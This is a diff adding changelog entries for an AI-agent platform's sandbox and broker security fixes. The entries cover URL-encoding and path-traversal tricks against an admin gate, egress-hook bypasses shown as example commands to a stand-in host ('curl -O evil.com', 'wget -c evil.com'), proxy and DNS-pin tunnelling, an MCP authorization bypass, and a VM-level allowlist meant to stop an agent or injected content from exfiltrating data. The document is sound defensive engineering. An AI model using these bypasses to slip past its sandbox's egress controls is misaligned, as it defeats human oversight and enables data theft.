+  (`/api/sync/tri%67ger`), or dot-segment traversal (`/api/foo/../…`) can no
+  longer read as non-admin to the gate while still reaching an admin handler.
+  Broker tickets are stored as a sha256 digest, not the raw bearer value — a
+  read of system state yields no usable ticket (RBAC review on #849).
+- Broker admin gate is fail-closed over *all* routes matching the method+path
+  (not just the first), so route-registration order can't let a non-admin
+  catch-all shadow a real admin route.
+- Anthropic broker proxy now serves sub-paths (`/api/broker/anthropic/{path}`),
+  so the SDK's `/v1/messages` calls reach it instead of 404ing; the loopback
+  relay forwards the caller's request headers (`Content-Type`,
+  `anthropic-version`, …) upstream — dropping hop-by-hop framing and swapping
+  the dummy credential for the ticket — and forwards the response
+  `Content-Type` back, so the in-sandbox SDK/CLI and the Anthropic API both
+  see well-formed requests/responses; and `kill()` revokes a session's broker
+  tickets at teardown so rows don't linger until TTL (Devin review on #849).
+
+---
+
+## [0.74.73] - 2026-07-15
+
+### Added
+
+- Connector SKILL.md frontmatter accepts `required: true` — required
+  connectors render as a separate mandatory "Install required tools" step in
+  the install prompt (no Y/n ask, wizard body inlined, must complete before
+  the optional connector asks; step numbers shift automatically). The default
+  prompt is unchanged when no connector sets the flag. `GET
+  /api/connectors/manifest` exposes the flag (`schema_version` 1 → 2,
+  additive), and the seed-sync render dry-run now reports a missing SKILL.md
+  body as an error for required connectors (warning for optional ones).
+
+---
+
+## [0.74.72] - 2026-07-15
+
+### Fixed
+
+- **Security (defense-in-depth):** the PreToolUse hook's curl/wget
+  value-flag skip set is now per-tool, closing an egress-bypass class where a
+  short flag that consumes its next token in one tool takes no argument in the
+  other. A shared set had let the token after such a flag — potentially the
+  request target — go unchecked: `curl -O evil.com` (curl `-O`/`--remote-name`
+  takes no arg) and `wget -c/-b/-F/-E/-m evil.com` (wget `--continue`/
+  `--background`/`--force-html`/`--adjust-extension`/`--mirror`, all no-arg,
+  vs the value-taking curl letters) all slipped past the allowlist. The hook
+  now selects the value-flag set by the invoked tool and lists only flags that
+  take a value for that tool, so an omission over-blocks (safe) rather than
+  skipping a real target. (The VM-level `network.allow_out` policy from
+  0.74.70 still blocked such egress on a configured deployment; this restores
+  the in-sandbox hook layer.) Follow-up to #847.
+
+---
+
+## [0.74.71] - 2026-07-14
+
+### Fixed
+
+- PreToolUse hook no longer misreads a `curl`/`wget` flag argument as a bare
+  host. A dotted flag value such as `--output results.example.csv` was
+  matched by the scheme-less host detector and denied even when the real
+  target was allowlisted; the detector now skips the values of value-taking
+  flags (`-o`/`--output`, `-d`/`--data`, `-H`/`--header`, …). Flags whose value
+  *is* (or can carry) the real network destination — `-x`/`--proxy`,
+  `-K`/`--config`, `--resolve`, `--connect-to` — are deliberately kept in
+  host-matching so a request can't tunnel past the allowlist through a proxy,
+  config file, or DNS pin. Safe direction only — an unlisted value-flag at
+  worst over-blocks its value, never lets the real request target through
+  unchecked. (Devin + security review follow-up on #846.)
+
+---
+
+## [0.74.70] - 2026-07-14
+
+### Changed
+
+- **Security:** chat sandboxes now enforce a VM-level outbound network allowlist
+  (E2B `network.allow_out`, set at sandbox-creation time from the Agnes server
+  process — outside the sandboxed agent's write path) rather than relying only
+  on the in-sandbox PreToolUse hook, so an agent (or injected content) can no
+  longer exfiltrate to an arbitrary host even if the hook is disabled or the
+  egress is attempted via a non-Bash tool. Configurable via
+  `chat.egress_allow_out`; defaults to the Agnes host, loopback,
+  `api.anthropic.com`, and `api.github.com`. Note: allowlist entries are
+  hostnames/CIDRs enforced by the E2B network layer; operators relying on this
+  against a DNS-rebinding threat model should confirm E2B enforces the
+  allowlist per-connection rather than resolving once at creation.
+
+### Fixed
+
+- **Security:** the in-sandbox PreToolUse hook (now defense-in-depth behind the
+  VM-level allowlist above) blocks scheme-less egress (`curl evil.com`, which
+  previously bypassed the `https?://`-only regex), environment dumps, and
+  filesystem enumeration; the bundled workspace `CLAUDE.md` gains defensive
+  safety instructions.
+
+---
+
+## [0.74.69] - 2026-07-14
+
+### Fixed
+- **Security:** the SSE and Streamable-HTTP MCP servers now enforce the same authorization + policy gate on passthrough tool *invocations* as the REST endpoint. Their dynamically-registered passthrough closures previously forwarded straight to the upstream MCP source, bypassing the per-group `tool_grants` check, the `mutating` admin-only gate, and the per-(tool, user) rate limit that `POST /api/mcp/passthrough/tools/{id}/call` enforces — so a caller reaching a passthrough tool over a remote MCP connector was neither grant-checked, mutation-gated, nor rate-limited (the credential leak on these transports was already closed in 0.74.66; this closes the gate bypass deferred there). The gate stack is now extracted into a single `enforce_passthrough_access` helper shared by both the REST endpoint and the transport closures so they can't drift; each transport re-fetches the live registry row per call (grant/mutating/rate-limit/`enabled` changes take effect immediately, no restart), fails closed when the caller identity can't be resolved from the request, applies the tool's `pii_fields` redaction to the response, and enforces the same pre-forward `scope='per_user'` credential guard (refuse with an `agnes mcp my-secret set <source>` remedy rather than an opaque upstream auth error).
+- **Known residual (invocation gated, listing not):** on the SSE / Streamable-HTTP transports every enabled passthrough tool's name + description + input schema is still advertised to any authenticated caller via the MCP `tools/list` response, regardless of that caller's `tool_grants` — invocation is now denied (above) but visibility is not yet filtered, unlike the REST listing (`_visible_passthrough_tools`) which already intersects with the caller's grants. Per-caller `tools/list` filtering on these transports is a follow-up (it needs the SDK's per-connection tool enumeration, not the one-time registration this fix touches).
+
+---
+
+## [0.74.68] - 2026-07-14
+
+### Fixed
+- Marketplace skill/agent detail hero now renders the same name-derived, type-tinted placeholder as the card grid — a skill named `Sales Dashboard` shows a green `SD` tile instead of a generic dark `SK`/`AG` glyph. Completes the #791 rollout (`name-derived, type-tinted placeholder initials`), which had tinted the card grid and the plugin detail hero but missed `marketplace_item_detail.html` (the standalone skill/agent detail page). Both the server-side placeholder and the post-load JS hydration now derive initials from the display name and apply the `--ds-accent-*` per-type tint (skill=green / agent=amber / plugin=blue).
 
 ---
 
